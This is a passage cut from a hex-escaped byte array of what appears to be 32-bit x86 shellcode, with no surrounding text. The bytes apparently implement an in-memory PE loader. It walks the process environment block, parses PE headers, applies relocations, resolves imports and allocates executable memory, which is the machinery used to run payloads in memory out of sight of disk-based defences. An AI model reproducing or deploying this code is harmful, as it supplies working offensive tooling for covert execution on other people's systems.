"\x00\x8b\x51\x14\x8d\x79\x18\x57\x55\x52\x8b\x0a\x89\x7c\x24\x40"
"\xff\x51\x44\x85\xc0\x0f\x88\xea\x00\x00\x00\x81\xc6\x0c\x04\x00"
"\x00\x33\xed\x80\x3e\x00\x0f\x84\x9a\x00\x00\x00\x8d\x84\x24\x88"
"\x00\x00\x00\x50\x56\x53\xe8\x43\x0d\x00\x00\x83\xc4\x0c\x8d\x44"
"\x24\x14\x50\x8d\x84\x24\x8c\x00\x00\x00\x50\xff\x93\x94\x00\x00"
"\x00\xff\x74\x24\x14\x89\x44\x24\x34\x55\x6a\x0c\xff\x93\x9c\x00"
"\x00\x00\x8b\xe8\x85\xed\x74\x5e\x83\x64\x24\x10\x00\x83\x7c\x24"
"\x14\x00\x76\x52\x8b\x7c\x24\x30\x33\xc0\xff\x34\x87\xff\x93\xb0"
"\x00\x00\x00\x6a\x08\x89\x44\x24\x64\x58\x66\x89\x44\x24\x58\x8d"
"\x44\x24\x58\x50\x8d\x44\x24\x14\x50\x55\xff\x93\xa0\x00\x00\x00"
"\x8b\xf0\x85\xf6\x79\x09\x55\xff\x93\xa4\x00\x00\x00\x33\xed\x8b"
"\x44\x24\x10\x40\x89\x44\x24\x10\x3b\x44\x24\x14\x72\xbc\x8b\x7c"
"\x24\x34\x85\xf6\x78\x3b\x8b\x07\x8d\x54\x24\x78\x52\x55\x83\xec"
"\x10\x8d\x74\x24\x60\x8b\x08\x8b\xfc\x6a\x00\xa5\x68\x18\x01\x00"
"\x00\xa5\xa5\xa5\x8b\x74\x24\x44\x56\x50\xff\x91\xe4\x00\x00\x00"
"\x85\xed\x74\x07\x55\xff\x93\xa4\x00\x00\x00\x8b\x6c\x24\x20\xeb"
"\x08\x8b\x6c\x24\x20\x8b\x74\x24\x24\x56\xff\x93\xb4\x00\x00\x00"
"\x55\xff\x93\xb4\x00\x00\x00\x33\xc0\x40\x5f\x5e\x5d\x5b\x81\xc4"
"\x7c\x02\x00\x00\xc3\x81\xec\x40\x03\x00\x00\x8b\x84\x24\x48\x03"
"\x00\x00\x53\x8b\x9c\x24\x48\x03\x00\x00\x05\x28\x05\x00\x00\x55"
"\x56\x33\xf6\x89\x44\x24\x30\x8b\x68\x3c\x03\xe8\x89\x74\x24\x14"
"\x56\x89\x74\x24\x10\x89\x74\x24\x28\x89\x6c\x24\x2c\xff\x53\x38"
"\x8b\xd0\x66\x8b\x45\x04\x8b\x4a\x3c\x66\x3b\x44\x11\x04\x0f\x85"
"\x15\x08\x00\x00\x8b\x45\x50\x89\x44\x24\x48\x89\x74\x24\x4c\x8b"
"\x85\xa4\x00\x00\x00\x89\x44\x24\x20\x85\xc0\x75\x07\x8b\x45\x34"
"\x89\x44\x24\x0c\x57\x6a\x03\x33\xc9\x8d\xbb\x25\x06\x00\x00\x5a"
"\x41\x80\x3f\x00\x56\x75\x27\x68\x00\x00\x00\x08\x6a\x40\x8d\x44"
"\x24\x58\x50\x56\x68\x1f\x00\x0f\x00\x8d\x44\x24\x5c\x50\xff\x93"
"\x20\x01\x00\x00\x85\xc0\x0f\x85\xbc\x07\x00\x00\xeb\x7a\x56\x52"
"\x56\x51\x68\x00\x00\x00\x80\x57\xff\x53\x60\x8b\xf8\x83\xff\xff"
"\x0f\x84\xa2\x07\x00\x00\x85\xff\x0f\x84\x9a\x07\x00\x00\x8d\x44"
"\x24\x3c\x0f\x57\xc0\x50\x57\x66\x0f\x13\x44\x24\x44\xff\x53\x64"
"\x85\xc0\x0f\x84\x80\x07\x00\x00\x8b\x45\x50\x3b\x44\x24\x3c\x0f"
"\x87\x73\x07\x00\x00\x57\x68\x00\x00\x00\x01\x6a\x02\x58\x50\x56"
"\x56\x68\x1f\x00\x0f\x00\x8d\x44\x24\x5c\x50\xff\x93\x20\x01\x00"
"\x00\x57\x8b\xf0\xff\x93\x90\x00\x00\x00\x85\xf6\x0f\x85\x46\x07"
"\x00\x00\x8d\xbb\x25\x06\x00\x00\x6a\x04\x58\x50\x56\x6a\x02\x58"
"\x50\x8d\x44\x24\x34\x50\x56\x56\x56\x8d\x44\x24\x2c\x50\xff\x53"
"\x70\x50\xff\x74\x24\x68\xff\x93\x24\x01\x00\x00\x8b\x74\x24\x34"
"\x8b\x4c\x24\x10\x8b\x76\x3c\x03\xf1\x89\x74\x24\x1c\x85\xc0\x74"
"\x0b\x3d\x03\x00\x00\x40\x0f\x85\xfc\x06\x00\x00\x85\xc9\x0f\x84"
"\xf4\x06\x00\x00\x80\x3f\x00\x74\x4a\x8d\x44\x24\x30\x50\x6a\x04"
"\x5f\x57\xff\x74\x24\x30\x51\xff\x53\x48\x57\x68\x00\x30\x00\x00"
"\xff\x75\x54\x6a\x00\xff\x53\x3c\xff\x75\x54\x8b\xf8\xff\x74\x24"
"\x14\x89\x7c\x24\x50\x57\xe8\x46\x11\x00\x00\xff\x74\x24\x34\x6a"
"\x00\xff\x74\x24\x24\xe8\x5b\x11\x00\x00\x8b\x4c\x24\x28\x83\xc4"
"\x18\xeb\x08\x8b\x44\x24\x3c\x89\x44\x24\x48\xff\x75\x54\xff\x74"
"\x24\x38\x51\xe8\x19\x11\x00\x00\x8b\x44\x24\x1c\x33\xc9\x83\x64"
"\x24\x20\x00\x83\xc4\x0c\x89\x46\x34\x0f\xb7\x46\x14\x83\xc0\x18"
"\x03\xc6\x89\x44\x24\x3c\x66\x3b\x4e\x06\x73\x44\x8b\x5c\x24\x14"
"\x8d\x78\x10\x8b\xee\xff\x37\x8b\x47\x04\x8b\x77\xfc\x03\x44\x24"
"\x38\x03\x74\x24\x14\x50\x56\xe8\xd5\x10\x00\x00\x0f\xb6\x06\x8d"
"\x7f\x28\x83\xc4\x0c\x89\x47\xd0\x0f\xb7\x45\x06\x43\x3b\xd8\x72"
"\xd4\x8b\x9c\x24\x54\x03\x00\x00\x8b\x6c\x24\x2c\x8b\x74\x24\x1c"
"\x8b\x54\x24\x10\x8b\xfa\x2b\x7d\x34\x83\x7c\x24\x24\x00\x0f\x84"
"\xc2\x00\x00\x00\x85\xff\x0f\x84\xba\x00\x00\x00\x8b\x86\xa0\x00"
"\x00\x00\x8d\x0c\x10\x03\x44\x24\x24\x89\x44\x24\x38\x03\xc2\x89"
"\x4c\x24\x20\x3b\xc8\x0f\x83\x9b\x00\x00\x00\x8b\x41\x04\x85\xc0"
"\x0f\x84\x90\x00\x00\x00\x8d\x71\x08\xeb\x6d\x0f\xb7\x36\x8b\x44"
"\x24\x20\x8b\xce\x81\xe1\xff\x0f\x00\x00\x03\x08\x8b\x44\x24\x1c"
"\x3b\x48\x50\x73\x43\x66\xc1\xee\x0c\x66\x83\xfe\x0a\x74\x08\x6a"
"\x03\x58\x66\x3b\xf0\x75\x05\x01\x3c\x11\xeb\x1d\x33\xc0\x40\x66"
"\x3b\xf0\x75\x07\x8b\xc7\xc1\xe8\x10\xeb\x0b\x6a\x02\x58\x66\x3b"
"\xf0\x75\x0c\x0f\xb7\xc7\x01\x04\x11\x8b\x54\x24\x10\xeb\x09\x66"
"\x85\xf6\x0f\x85\x1f\x05\x00\x00\x8b\x74\x24\x14\x6a\x02\x59\x03"
"\xf1\x8b\x4c\x24\x20\x8b\x41\x04\x03\xc1\x89\x74\x24\x14\x3b\xf0"
"\x75\x89\x8b\x44\x24\x38\x8b\xce\x03\xc2\x89\x74\x24\x20\x3b\xf0"
"\x0f\x82\x65\xff\xff\xff\x8b\x44\x24\x1c\x8b\x80\x80\x00\x00\x00"
"\x85\xc0\x0f\x84\xc4\x00\x00\x00\x8d\x34\x10\x83\x7e\x0c\x00\x89"
"\x74\x24\x18\x0f\x84\xb3\x00\x00\x00\x8b\x46\x0c\x03\xc2\x50\x53"
"\xe8\x3e\x09\x00\x00\x8b\x54\x24\x18\x8b\x7e\x10\x89\x44\x24\x40"
"\x03\xfa\x8b\x06\x03\xc2\x89\x7c\x24\x28\x59\x59\x89\x44\x24\x14"
"\x8b\x08\x85\xc9\x74\x71\x8b\x6c\x24\x38\x8b\xb4\x24\x58\x03\x00"
"\x00\x79\x0c\x51\x6a\x00\x55\x53\xe8\xa4\x09\x00\x00\xeb\x32\x8d"
"\x7a\x02\x03\xf9\x83\x7e\x04\x00\x74\x19\x57\x53\xe8\x93\xf2\xff"
"\xff\x59\x59\x85\xc0\x74\x0c\x8b\x83\x08\x01\x00\x00\x8b\x7c\x24"
"\x20\xeb\x11\x6a\x00\x57\x55\x53\xe8\x74\x09\x00\x00\x8b\x7c\x24"
"\x30\x83\xc4\x10\x89\x07\x8b\x44\x24\x14\x8b\x54\x24\x10\x6a\x04"
"\x59\x03\xc1\x03\xf9\x89\x44\x24\x14\x89\x7c\x24\x20\x8b\x08\x85"
"\xc9\x75\x9e\x8b\x74\x24\x18\x83\xc6\x14\x89\x74\x24\x18\x83\x7e"
"\x0c\x00\x0f\x85\x51\xff\xff\xff\x8b\x6c\x24\x2c\x8b\x44\x24\x1c"
"\x8b\x80\xe0\x00\x00\x00\x85\xc0\x0f\x84\x8c\x00\x00\x00\x8d\x70"
"\x04\x03\xf2\x89\x74\x24\x18\x8b\x06\x85\xc0\x74\x7d\x03\xc2\x50"
"\x53\xe8\x6d\x08\x00\x00\x8b\x54\x24\x18\x89\x44\x24\x40\x59\x59"
"\x85\xc0\x74\x55\x8b\x7e\x0c\x8b\x4e\x08\x03\xfa\x03\xca\x89\x4c"
"\x24\x14\x8b\x07\x85\xc0\x74\x41\x8b\x6c\x24\x38\x6a\x04\x5e\x79"
"\x04\x33\xc9\xeb\x05\x8d\x4a\x02\x03\xc8\x33\xd2\x85\xc0\x0f\x49"
"\xc2\x50\x51\x55\x53\xe8\xc7\x08\x00\x00\x8b\x4c\x24\x24\x03\xfe"
"\x83\xc4\x10\x89\x01\x03\xce\x8b\x07\x8b\x54\x24\x10\x89\x4c\x24"
"\x14\x85\xc0\x75\xca\x8b\x74\x24\x18\x83\xc6\x20\x89\x74\x24\x18"
"\x8b\x06\x85\xc0\x75\x87\x8b\x6c\x24\x2c\x8b\x44\x24\x1c\x8d\x7c"
"\x24\x54\x6a\x3e\x59\x8b\xf5\x8b\x40\x28\xf3\xa5\x8b\x7c\x24\x58"
"\x03\xc2\xc1\xef\x10\x6a\x04\x6b\xf7\x28\x68\x00\x30\x00\x00\x89"
"\x44\x24\x34\x89\x7c\x24\x1c\x56\x6a\x00\xff\x53\x3c\x56\xff\x74"
"\x24\x40\x89\x44\x24\x20\x50\xe8\x25\x0e\x00\x00\x33\xc0\x83\xc4"
"\x0c\x40\x39\x83\x74\x05\x00\x00\x75\x42\x80\xbb\x25\x06\x00\x00"
"\x00\x75\x21\xff\x75\x54\x6a\x00\xff\x74\x24\x18\xe8\x24\x0e\x00"
"\x00\xff\x75\x54\x6a\x00\xff\x74\x24\x48\xe8\x16\x0e\x00\x00\x83"
"\xc4\x18\xeb\x18\x8b\x44\x24\x48\x85\xc0\x74\x10\xff\x75\x54\x50"
"\xff\x74\x24\x18\xe8\xd8\x0d\x00\x00\x83\xc4\x0c\x80\xbb\x25\x06"
"\x00\x00\x00\x75\x58\xff\x74\x24\x10\xff\x53\x70\x50\xff\x93\x28"
"\x01\x00\x00\x85\xc0\x0f\x85\x2d\x03\x00\x00\x8b\x44\x24\x10\x33"
"\xc9\x39\x4c\x24\x24\x68\x80\x00\x00\x00\x51\x6a\x02\x0f\x45\xc1"
"\x21\x4c\x24\x34\x89\x44\x24\x1c\x58\x50\x8d\x44\x24\x34\x50\x51"
"\x51\x51\x8d\x44\x24\x2c\x50\xff\x53\x70\x50\xff\x74\x24\x68\xff"
"\x93\x24\x01\x00\x00\x85\xc0\x0f\x85\xeb\x02\x00\x00\x8d\x44\x24"
"\x30\x50\x6a\x08\xff\x74\x24\x30\xff\x74\x24\x1c\xff\x53\x48\x33"
"\xc0\x89\x44\x24\x24\x85\xff\x0f\x84\xab\x00\x00\x00\x8b\x7c\x24"
"\x18\x8b\x74\x24\x3c\x83\xc7\x0c\x8b\x57\x18\x8b\xea\x8b\xca\xc1"
"\xed\x1e\xc1\xea\x1d\xc1\xe9\x1f\x83\xe2\x01\x85\xd1\x75\x77\x85"
"\xd5\x74\x04\x6a\x20\xeb\x2f\x8b\xc2\x83\xf0\x01\x89\x44\x24\x3c"
"\x23\xc1\x85\xc5\x74\x0e\x80\xbb\x25\x06\x00\x00\x00\x6a\x08\x5e"
"\x6a\x04\xeb\x1d\x33\xc0\x40\x33\xc8\x8b\xc5\x83\xf0\x01\x23\xc1"
"\x85\xc2\x74\x05\x6a\x10\x5e\xeb\x0c\x23\x4c\x24\x3c\x85\xcd\x6a"
"\x02\x58\x0f\x45\xf0\x8b\x54\x24\x10\x8b\x0f\x03\xd1\x8b\x44\x24"
"\x14\x48\x39\x44\x24\x24\x73\x07\x8b\x47\x28\x2b\xc1\xeb\x03\x8b"
"\x47\x04\x83\x64\x24\x30\x00\x8d\x4c\x24\x30\x51\x56\x50\x52\xff"
"\x53\x48\x8b\x44\x24\x24\x40\x83\xc7\x28\x89\x44\x24\x24\x3b\x44"
"\x24\x14\x0f\x82\x60\xff\xff\xff\x8d\x44\x24\x30\x33\xff\x50\x6a"
"\x02\x58\x50\xff\xb4\x24\x88\x00\x00\x00\x89\x7c\x24\x3c\xff\x74"
"\x24\x1c\xff\x53\x48\x8b\x44\x24\x1c\x8b\x4c\x24\x10\x8b\xb0\xc0"
"\x00\x00\x00\x85\xf6\x74\x2a\x8b\x74\x0e\x0c\x85\xf6\x74\x22\x8b"
"\x06\x85\xc0\x74\x1c\x6a\x04\x5b\x57\x6a\x01\x51\xff\xd0\x8b\x4c"
"\x24\x10\x03\xf3\x8b\x06\x85\xc0\x75\xee\x8b\x9c\x24\x54\x03\x00"
"\x00\x8b\xac\x24\x58\x03\x00\x00\x6a\x03\x58\x39\x45\x00\x0f\x85"
"\xe6\x00\x00\x00\x33\xc0\x40\x57\x50\x8b\x84\x24\x84\x00\x00\x00"
"\x51\x03\xc1\xff\xd0\x80\xbd\x0c\x03\x00\x00\x00\x0f\x84\x1d\x01"
"\x00\x00\x8b\x8c\x24\xcc\x00\x00\x00\x8b\x54\x24\x10\x85\xc9\x0f"
"\x84\x0e\x01\x00\x00\x8b\x74\x11\x18\x85\xf6\x0f\x84\x02\x01\x00"
"\x00\x8b\x44\x11\x20\x8d\x7e\xff\x8b\x6c\x11\x1c\x03\xc2\x8b\x4c"
"\x11\x24\x03\xea\x03\xca\x89\x4c\x24\x3c\x8d\x3c\xb8\x8b\x8c\x24"
"\x58\x03\x00\x00\x8b\x07\x81\xc1\x0c\x03\x00\x00\x03\xc2\x51\x50"
"\xe8\x05\x0c\x00\x00\x8b\x54\x24\x18\x59\x59\x85\xc0\x74\x0f\x6a"
"\x04\x58\x2b\xf8\x83\xee\x01\x75\xd4\xe9\xc9\x00\x00\x00\x8b\x44"
"\x24\x3c\x0f\xb7\x44\x70\xfe\x8b\x74\x85\x00\x03\xf2\x0f\x84\xb4"
"\x00\x00\x00\x8b\xac\x24\x58\x03\x00\x00\x8d\xbd\x0c\x04\x00\x00"
"\x80\x3f\x00\x74\x31\x83\xbd\x0c\x05\x00\x00\x00\x74\x12\x8d\x84"
"\x24\x4c\x01\x00\x00\x50\x57\x53\xe8\xe1\x04\x00\x00\x83\xc4\x0c"
"\x83\xbd\x0c\x05\x00\x00\x00\x8d\x84\x24\x4c\x01\x00\x00\x0f\x44"
"\xc7\x50\xff\xd6\xeb\x59\xff\xd6\xeb\x55\x8d\x85\x0c\x04\x00\x00"
"\x80\x38\x00\x74\x20\x8d\x8c\x24\x4c\x01\x00\x00\x51\x50\x53\xe8"
"\xaa\x04\x00\x00\x8d\x84\x24\x58\x01\x00\x00\x50\x53\xe8\x74\x02"
"\x00\x00\x83\xc4\x14\x39\x7d\x04\x74\x18\x57\x57\x57\xff\x74\x24"
"\x38\x57\x57\xff\x53\x5c\x85\xc0\x74\x15\x6a\xff\x50\xff\x53\x58"
"\xeb\x0d\x64\xa1\x18\x00\x00\x00\xff\x70\x30\xff\x54\x24\x30\x8b"
"\x54\x24\x10\x6a\x03\x58\x39\x83\x30\x02\x00\x00\x75\x09\x6a\xff"
"\xff\x53\x4c\x8b\x54\x24\x10\x85\xd2\x74\x42\x0f\xb7\x44\x24\x5a"
"\xbe\x00\xc0\x00\x00\x6b\xc0\x28\x56\x50\xff\x74\x24\x20\xff\x53"
"\x40\x8b\x44\x24\x48\x85\xc0\x74\x0c\x56\xff\xb4\x24\xac\x00\x00"
"\x00\x50\xff\x53\x40\xff\x74\x24\x10\xff\x53\x70\x50\xff\x93\x28"
"\x01\x00\x00\xff\x74\x24\x44\xff\x93\x90\x00\x00\x00\x8b\x84\x24"
"\x58\x03\x00\x00\xff\xb0\x24\x05\x00\x00\x6a\x00\xff\x74\x24\x3c"
"\xe8\xb0\x0a\x00\x00\x83\xc4\x0c\x5f\x5e\x5d\x5b\x81\xc4\x40\x03"
"\x00\x00\xc3\x81\xec\xf4\x02\x00\x00\x53\x8b\x9c\x24\xfc\x02\x00"
"\x00\x55\x56\x6a\x04\x8b\x83\x58\x0d\x00\x00\x33\xf6\x68\x00\x30"
"\x00\x00\x8d\x04\x45\x02\x00\x00\x00\x50\x56\xff\x53\x3c\x8b\xe8"
"\x85\xed\x0f\x84\x84\x01\x00\x00\x8b\x84\x24\x08\x03\x00\x00\x8b"
"\x88\x24\x05\x00\x00\x05\x28\x05\x00\x00\x03\xc9\x51\x55\x6a\xff"
"\x50\x56\x56\xff\x53\x50\x8d\x44\x24\x58\x89\x44\x24\x14\x8d\x44"
"\x24\x14\x50\x53\xe8\xa5\xdf\xff\xff\x8d\x44\x24\x4c\x89\x44\x24"
"\x24\x8d\x44\x24\x24\x50\x53\xe8\x48\xde\xff\xff\x8d\x84\x24\x94"
"\x00\x00\x00\x89\x44\x24\x38\x8d\x44\x24\x38\x50\x53\xe8\xdb\xe9"
"\xff\xff\x83\xc4\x18\x56\x56\xff\x93\xec\x00\x00\x00\x85\xc0\x0f"
"\x85\xf5\x00\x00\x00\x8d\x44\x24\x0c\x50\x8d\x83\xd0\x08\x00\x00"
"\x50\x6a\x03\x56\x8d\x83\xb0\x08\x00\x00\x50\xff\x93\xf0\x00\x00"
"\x00\x85\xc0\x0f\x85\xd1\x00\x00\x00\x8b\x4c\x24\x0c\x8d\x44\x24"
"\x10\x50\x8d\x83\x00\x09\x00\x00\x50\x8b\x11\x51\xff\x12\x85\xc0"
"\x0f\x85\xa0\x00\x00\x00\x8b\x44\x24\x10\x50\x8b\x08\xff\x51\x0c"
"\x85\xc0\x0f\x85\x84\x00\x00\x00\x8b\x4c\x24\x0c\x8d\x54\x24\x14"
"\x89\x4c\x24\x34\x52\x51\x8b\x01\xff\x50\x0c\x85\xc0\x75\x6d\x57"
"\x8d\x84\x24\x00\x01\x00\x00\x50\x8d\x83\x11\x06\x00\x00\x50\x53"
"\xe8\xc9\x02\x00\x00\x83\xc4\x0c\x8d\x84\x24\x00\x01\x00\x00\x50"
"\xff\x93\xb0\x00\x00\x00\x8b\x4c\x24\x10\x8b\xf8\x6a\x02\x57\x51"
"\x8b\x11\xff\x52\x20\x57\x8b\xf0\xff\x93\xb4\x00\x00\x00\x5f\x85"
"\xf6\x75\x27\x8b\x44\x24\x10\x33\xf6\x56\x56\x56\x8b\x08\x56\x56"
"\x56\x56\x56\x55\x50\xff\x51\x14\x85\xc0\x75\x10\x8b\x44\x24\x0c"
"\x6a\x02\x50\x8b\x08\xff\x51\x14\xeb\x02\x33\xf6\x8b\x44\x24\x10"
"\x50\x8b\x08\xff\x51\x08\x8b\x44\x24\x0c\x50\x8b\x08\xff\x51\x1c"
"\x8b\x44\x24\x0c\x50\x8b\x08\xff\x51\x08\x8b\x83\x58\x0d\x00\x00"
"\x8d\x04\x45\x02\x00\x00\x00\x50\x56\x55\xe8\xf6\x08\x00\x00\x83"
"\xc4\x0c\x68\x00\xc0\x00\x00\x56\x55\xff\x53\x40\x5e\x5d\x5b\x81"
"\xc4\xf4\x02\x00\x00\xc3\x81\xec\x94\x00\x00\x00\x64\xa1\x18\x00"
"\x00\x00\x53\x8b\x9c\x24\x9c\x00\x00\x00\x55\x8b\x40\x30\x56\x89"
"\x44\x24\x0c\x8d\x83\x48\x03\x00\x00\x57\x50\xff\x53\x38\x8b\xe8"
"\x33\xc0\x8b\x55\x3c\x03\xd5\x0f\xb7\x7a\x14\x0f\xb7\x72\x06\x03"
"\xfa\x8d\x4f\x18\x85\xf6\x74\x12\x8b\x93\x40\x03\x00\x00\x39\x11"
"\x74\x35\x40\x83\xc1\x28\x3b\xc6\x72\xf4\x8b\x74\x24\x10\x8b\x7c"
"\x24\x10\xff\x53\x78\x33\xc9\x8b\xe8\x85\xf6\x74\x40\x8b\xd7\x8d"
"\x42\x04\x89\x54\x24\x18\x8b\xd0\x39\x28\x74\x1d\x41\x3b\xce\x72"
"\xee\x8b\x6c\x24\x18\xeb\x2e\x6b\xc0\x28\x03\xc7\x8b\x78\x24\x8b"
"\x70\x20\x03\xfd\xc1\xee\x02\xeb\xc9\xff\xb4\x24\xac\x00\x00\x00"
"\x8b\x6c\x24\x1c\x55\xff\x93\x10\x01\x00\x00\xeb\x08\x8b\x6c\x24"
"\x10\x89\x6c\x24\x18\xff\x53\x74\x33\xc9\x8b\xd0\x85\xf6\x74\x2d"
"\x39\x57\x04\x74\x0a\x41\x83\xc7\x04\x3b\xce\x72\xf3\xeb\x1e\x6a"
"\x01\x55\x8d\x44\x24\x24\x50\xff\x93\x00\x01\x00\x00\x6a\x08\x8d"
"\x44\x24\x20\x50\x57\xe8\xd7\x07\x00\x00\x83\xc4\x0c\x8b\x44\x24"
"\x10\x8b\x40\x0c\x8b\x78\x0c\x83\x7f\x18\x00\x0f\x84\x1f\x01\x00"
"\x00\x8d\x83\x70\x03\x00\x00\x8b\xd0\x89\x54\x24\x14\x8a\x02\x33"
"\xed\x83\x64\x24\x10\x00\x45\x33\xc9\x84\xc0\x0f\x84\xed\x00\x00"
"\x00\x8d\x5c\x24\x24\x8b\xf2\x2b\xda\x8b\xd5\x3c\x3b\x74\x29\x81"
"\xf9\x80\x00\x00\x00\x73\x21\x3c\x77\x75\x04\x33\xed\xeb\x0e\x8b"
"\xea\x3c\x70\x75\x08\xc7\x44\x24\x10\x01\x00\x00\x00\x88\x04\x1e"
"\x41\x46\x8a\x06\x84\xc0\x75\xd1\x8b\x9c\x24\xa8\x00\x00\x00\x85"
"\xc9\x0f\x84\xa7\x00\x00\x00\x8b\x44\x24\x14\x40\xc6\x44\x0c\x24"
"\x00\x03\xc1\x89\x44\x24\x14\x8d\x44\x24\x24\x6a\x00\x50\xff\x77"
"\x18\x53\xe8\x6a\x01\x00\x00\x8b\x54\x24\x24\x8b\xf0\x83\xc4\x10"
"\x85\xf6\x0f\x84\x75\xff\xff\xff\x85\xed\x74\x33\x83\x7c\x24\x10"
"\x00\x74\x10\xff\xd6\x8b\x54\x24\x14\x8b\xf0\x85\xf6\x0f\x84\x5a"
"\xff\xff\xff\xff\x36\x53\xe8\x9a\xea\xff\xff\x8b\x54\x24\x1c\x59"
"\x59\x85\xc0\x0f\x84\x44\xff\xff\xff\x8b\x44\x24\x20\xeb\x34\x83"
"\x7c\x24\x10\x00\x74\x10\xff\xd6\x8b\x54\x24\x14\x8b\xf0\x85\xf6"
"\x0f\x84\x27\xff\xff\xff\xff\x36\x53\xe8\x67\xea\xff\xff\x8b\x54"
"\x24\x1c\x59\x59\x85\xc0\x0f\x84\x11\xff\xff\xff\x8b\x44\x24\x18"
"\x8b\x40\x04\x8b\x54\x24\x14\x89\x06\xe9\xff\xfe\xff\xff\x8b\x3f"
"\x8d\x83\x70\x03\x00\x00\x83\x7f\x18\x00\x0f\x85\xe7\xfe\xff\xff"
"\x5f\x5e\x33\xc0\x5d\x40\x5b\x81\xc4\x94\x00\x00\x00\xc3\x8b\x44"
"\x24\x04\x68\x00\x01\x00\x00\xff\x74\x24\x10\x6a\xff\xff\x74\x24"
"\x14\x6a\x00\x6a\x00\xff\x50\x50\xc3\xe8\x00\x00\x00\x00\x58\x83"
"\xe8\x05\xc3\x55\x8b\xec\x8b\x55\x0c\x83\xec\x40\x33\xc9\x53\x56"
"\x83\xcb\xff\x57\x38\x0a\x74\x16\x8d\x75\xc0\x2b\xf2\x83\xf9\x40"
"\x73\x0c\x8a\x02\x41\x88\x04\x16\x42\x80\x3a\x00\x75\xef\x80\x7c"
"\x0d\xbc\x2e\xc6\x44\x0d\xc0\x00\x74\x0d\xc7\x44\x0d\xc0\x2e\x64"
"\x6c\x6c\xc6\x44\x0d\xc4\x00\x64\xa1\x18\x00\x00\x00\x8b\x40\x30"
"\x8b\x40\x0c\x8b\x78\x0c\x8b\x77\x18\x85\xf6\x74\x31\x8b\x46\x3c"
"\x8b\x4c\x30\x78\x33\xc0\x85\xc9\x74\x1a\x8b\x44\x31\x0c\x03\xc6"
"\x50\x8d\x45\xc0\x50\xe8\x57\x06\x00\x00\x8b\xd8\x33\xc0\x59\x59"
"\x85\xdb\x74\x19\x8b\x3f\x85\xdb\x75\xcc\x85\xc0\x75\x0a\x8d\x45"
"\xc0\x50\x8b\x45\x08\xff\x50\x30\x5f\x5e\x5b\xc9\xc3\x8b\xc6\xeb"
"\xf7\x81\xec\x90\x00\x00\x00\x53\x55\x56\x57\x8b\xbc\x24\xa8\x00"
"\x00\x00\x33\xf6\x85\xff\x0f\x84\x33\x01\x00\x00\x8b\x4f\x3c\x89"
"\x4c\x24\x18\x8b\x44\x39\x78\x85\xc0\x0f\x84\x20\x01\x00\x00\x8d"
"\x1c\x38\x8b\x43\x20\x8b\x53\x1c\x03\xc7\x89\x44\x24\x10\x03\xd7"
"\x8b\x43\x24\x03\xc7\x89\x54\x24\x1c\x39\xb4\x24\xac\x00\x00\x00"
"\x0f\x84\xe5\x00\x00\x00\x8b\x6b\x18\x85\xed\x0f\x84\xee\x00\x00"
"\x00\x8d\x04\x68\x83\xc0\xfe\x89\x44\x24\x14\x8b\x44\x24\x10\x8d"
"\x04\xa8\x83\xc0\xfc\x89\x44\x24\x10\x8b\x00\xff\xb4\x24\xac\x00"
"\x00\x00\x03\xc7\x50\xe8\x80\x05\x00\x00\x59\x59\x85\xc0\x75\x10"
"\x8b\x44\x24\x14\x8b\x4c\x24\x1c\x0f\xb7\x00\x8b\x34\x81\x03\xf7"
"\x8b\x44\x24\x10\x83\x6c\x24\x14\x02\x83\xe8\x04\x89\x44\x24\x10"
"\x83\xed\x01\x74\x04\x85\xf6\x74\xc0\x8b\x4c\x24\x18\x3b\xf3\x72"
"\x76\x8b\x44\x39\x7c\x03\xc3\x3b\xf0\x73\x6c\x33\xc9\x38\x0e\x74"
"\x1d\x8d\x5c\x24\x20\x8b\xd6\x2b\xde\x83\xf9\x3c\x73\x10\x8a\x02"
"\x88\x04\x13\x3c\x2e\x74\x07\x41\x42\x80\x3a\x00\x75\xeb\xc7\x44"
"\x0c\x21\x64\x6c\x6c\x00\x33\xd2\x41\x03\xce\x38\x11\x74\x17\x8d"
"\x74\x24\x60\x2b\xf1\x83\xfa\x3f\x73\x0c\x8a\x01\x42\x88\x04\x0e"
"\x41\x80\x39\x00\x75\xef\x8d\x44\x24\x60\xc6\x44\x14\x60\x00\x50"
"\x8d\x44\x24\x24\x50\x57\xff\xb4\x24\xb0\x00\x00\x00\xe8\xd4\xe2"
"\xff\xff\x83\xc4\x10\x8b\xf0\x8b\xc6\xeb\x16\x8b\x84\x24\xb0\x00"
"\x00\x00\x2b\x43\x10\x8b\x34\x82\x03\xf7\xe9\x6e\xff\xff\xff\x33"
"\xc0\x5f\x5e\x5d\x5b\x81\xc4\x90\x00\x00\x00\xc3\x55\x8b\xec\x64"
"\xa1\x18\x00\x00\x00\x33\xc9\x56\x8b\x40\x30\x8b\x40\x0c\x8b\x70"
"\x0c\xeb\x20\x85\xc9\x75\x23\xff\x75\x18\xff\x75\x14\xff\x75\x10"
"\xff\x75\x0c\x50\xff\x75\x08\xe8\xd5\xe0\xff\xff\x8b\x36\x83\xc4"
"\x18\x8b\xc8\x8b\x46\x18\x85\xc0\x75\xd9\x8b\xc1\x5e\x5d\xc3\x83"
"\xec\x14\x53\x8b\x5c\x24\x24\x33\xc0\x55\x56\x33\xed\x89\x44\x24"
"\x0c\x57\x8b\x7c\x24\x2c\x33\xf6\x89\x74\x24\x2c\x8b\x4c\x24\x28"
"\x8a\x0c\x08\x84\xc9\x74\x1e\x83\xf8\x40\x74\x19\x88\x4c\x2c\x14"
"\x45\x40\x89\x7c\x24\x2c\x89\x44\x24\x10\x89\x74\x24\x2c\x83\xfd"
"\x10\x75\x6f\xeb\x54\x6a\x10\x58\x2b\xc5\x8d\x74\x24\x14\x50\x03"
"\xf5\x6a\x00\x56\xe8\xfc\x03\x00\x00\x83\xc4\x0c\xc6\x06\x80\x83"
"\xfd\x0c\x72\x21\x53\x8d\x44\x24\x18\x57\x50\xe8\x56\x00\x00\x00"
"\x6a\x10\x33\xf8\x33\xda\x8d\x44\x24\x24\x6a\x00\x50\xe8\xd3\x03"
"\x00\x00\x83\xc4\x18\x8b\x44\x24\x10\x8b\x74\x24\x2c\xc1\xe0\x03"
"\x46\x89\x44\x24\x20\x89\x74\x24\x2c\x53\x8d\x44\x24\x18\x57\x50"
"\xe8\x21\x00\x00\x00\x33\xf8\x83\xc4\x0c\x8b\x44\x24\x10\x33\xda"
"\x33\xed\x85\xf6\x0f\x84\x62\xff\xff\xff\x8b\xc7\x8b\xd3\x5f\x5e"
"\x5d\x5b\x83\xc4\x14\xc3\x83\xec\x10\x8b\x44\x24\x18\x8b\x54\x24"
